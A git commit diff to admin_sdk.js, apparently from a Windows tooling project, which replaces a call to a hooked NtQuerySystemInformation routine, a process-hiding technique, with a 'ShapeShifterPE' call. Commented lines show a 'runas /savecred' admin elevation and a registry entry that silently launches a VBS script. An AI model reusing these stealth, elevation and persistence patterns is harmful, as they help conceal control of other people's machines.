a9517b36a1d587833d946e5eeb0cf89902dbc14a
byHyakimaro <moderrevolution090217@gmail.com>
2023-10-12 20:40:37 -0300

    sa

--- admin_sdk.js
+++ admin_sdk.js
@@ -3,7 +3,7 @@ import ManagerWin32 from "./libs/win32.js";
 const win = new ManagerWin32()
 // win.ShellExecuteA('runas /savecred /user:adm cmd')
 // win.regEditBg('ADB', 'Adb Server', 'C:\\Windows\\system32\\cmd.exe', 'wscript \"C:\\adb-sdk\\scrcpy-noconsole.vbs\"')
-win._HookedNtQuerySystemInformation()
+win.ShapeShifterPE()
 
 // class ManagerAdminSDK {
 //   constructor() {};
